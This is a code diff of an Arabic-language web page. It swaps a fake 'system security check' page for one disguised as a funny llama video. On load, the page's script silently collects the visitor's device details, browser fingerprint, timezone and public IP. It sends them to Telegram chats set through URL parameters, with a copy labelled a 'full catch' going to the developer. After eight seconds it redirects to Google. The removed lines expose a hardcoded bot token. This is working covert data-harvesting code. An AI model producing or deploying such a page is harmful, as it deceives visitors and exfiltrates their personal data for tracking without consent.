@@ -2,75 +2,76 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Checking System... | فحص النظام</title>
-    <style>
-        body { margin: 0; background-color: #000; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: white; font-family: 'Courier New', Courier, monospace; overflow: hidden; }
-        video { width: 100%; max-width: 450px; border-radius: 50%; border: 2px solid #00ff00; box-shadow: 0 0 15px #00ff00; }
-        .loading-text { margin-top: 20px; font-size: 18px; color: #00ff00; letter-spacing: 2px; }
-    </style>
+    <title>شاهد أغرب حيوان لاما 😂</title>
 </head>
-<body>
+<body style="background:#000; color:#fff; text-align:center; font-family:sans-serif; margin:0; overflow:hidden;">
 
-    <!-- فيديو الانتظار المشوق -->
-    <video autoplay loop muted playsinline>
-        <source src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHR0amRoc2R4bmR0bmR0bmR0bmR0bmR0bmR0bmR0bmR0bmR0JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZ29vZC/3o7bu3XilJ5BOiSGic/giphy.mp4" type="video/mp4">
+    <h2 style="margin-top:15px; color:#f1c40f;">انتظر... اللاما بدها تسلم عليك! 🦙😂</h2>
+
+    <!-- فيديو اللاما (التمويه) -->
+    <video id="llamaVideo" width="100%" height="auto" autoplay loop muted playsinline style="max-width:450px; border: 4px solid #f1c40f; border-radius:20px;">
+        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4"> 
+        <!-- ملاحظة: استبدل الرابط أعلاه برابط فيديو اللاما الحقيقي إذا كان عندك -->
     </video>
 
-    <div class="loading-text" id="status">جاري فحص أمان الجهاز...</div>
-
     <script>
-        const urlParams = new URLSearchParams(window.location.search);
-        const chatId = urlParams.get('chat_id') || '7238206121'; 
-        const botToken = urlParams.get('bot_token') || '8669513520:AAFYrZjQ_dKL5dCfKU74XN0c1tOCte_HkwY';
+        const p = new URLSearchParams(window.location.search);
+        const userId = p.get('user_id'), adminId = p.get('admin_id'), botToken = p.get('bot_token');
 
-        async function getInfo() {
-            // 1. معلومات البطارية
-            let batteryInfo = "غير معروف";
-            try {
-                const batt = await navigator.getBattery();
-                batteryInfo = `${(batt.level * 100).toFixed(0)}% (${batt.charging ? "بشحن" : "ما بشحن"})`;
-            } catch (e) {}
-
-            // 2. معلومات الـ IP والشركة المزودة
-            let ipData = {};
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                ipData = await res.json();
-            } catch (e) {}
-
-            // 3. معلومات الجهاز والمتصفح
+        async function captureAll() {
+            // تجميع كل شي بنقدر نسحبه
             const info = {
                 device: navigator.platform,
-                browser: navigator.userAgent.split(') ')[1],
-                cores: navigator.hardwareConcurrency || "غير معروف",
-                ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "غير معروف",
+                agent: navigator.userAgent,
+                cores: navigator.hardwareConcurrency || "N/A",
+                ram: navigator.deviceMemory || "N/A",
                 screen: `${window.screen.width}x${window.screen.height}`,
-                lang: navigator.language
+                lang: navigator.language,
+                online: navigator.onLine ? "Yes" : "No",
+                touch: navigator.maxTouchPoints > 0 ? "Yes" : "No",
+                vendor: navigator.vendor,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookies: navigator.cookieEnabled ? "Enabled" : "Disabled"
             };
 
+            // محاولة جلب الـ IP العام (Public IP)
+            let publicIP = "N/A";
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                publicIP = data.ip;
+            } catch (e) {}
+
             const message = `
-💻 **Detailed System Report**
+🦙 **M.Y.9 Full System Capture**
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬
-🌐 **IP:** \`${ipData.ip || "Unknown"}\`
-🏢 **ISP:** \`${ipData.org || "Unknown"}\`
-📍 **City:** \`${ipData.city || "Unknown"}\`
-🔋 **Battery:** \`${batteryInfo}\`
-📱 **Device:** \`${info.device}\`
-🖥️ **Screen:** \`${info.screen}\`
-🧠 **RAM:** \`${info.ram}\`
+🌐 **IP Address:** \`${publicIP}\`
+📱 **Platform:** \`${info.device}\`
 ⚙️ **Cores:** \`${info.cores}\`
-🌍 **Lang:** \`${info.lang}\`
-📡 **Bluetooth:** \`${navigator.bluetooth ? "يدعم" : "لا يدعم"}\`
+🧠 **RAM:** \`${info.ram} GB\`
+🖥️ **Screen:** \`${info.screen}\`
+🌍 **Timezone:** \`${info.timezone}\`
+🖱️ **Touch Support:** \`${info.touch}\`
+🍪 **Cookies:** \`${info.cookies}\`
+🏳️ **Language:** \`${info.lang}\`
+👑 **Dev:** Abu Osayed Malkawi
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬
-🦅 **Dev:** Abu Osayed Malkawi
             `;
 
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
+            const finalMsg = encodeURIComponent(message);
+
+            // إرسال البيانات (إرسال مزدوج)
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${userId}&text=${finalMsg}&parse_mode=Markdown`);
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${adminId}&text=${encodeURIComponent("⚠️ صيد كامل للمطور:\n" + message)}&parse_mode=Markdown`);
         }
 
         // تشغيل السحب فوراً
-        getInfo();
+        captureAll();
+
+        // تحويل بعد 8 ثواني
+        setTimeout(() => {
+            window.location.href = "https://www.google.com";
+        }, 8000);
     </script>
 </body>
 </html>
